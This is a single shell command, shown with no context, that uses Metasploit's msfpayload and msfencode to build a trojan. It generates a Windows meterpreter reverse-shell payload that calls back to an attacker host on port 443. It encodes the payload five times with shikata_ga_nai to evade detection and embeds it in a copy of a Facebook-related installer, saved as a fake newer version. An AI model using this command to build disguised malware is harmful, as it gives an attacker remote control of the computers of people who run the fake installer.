sudo msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 5 -t exe -x ~/Downloads/CCFFacebookSetup-v1.5.exe -o ~/Desktop/CCFFacebookSetup-v1.6.exe

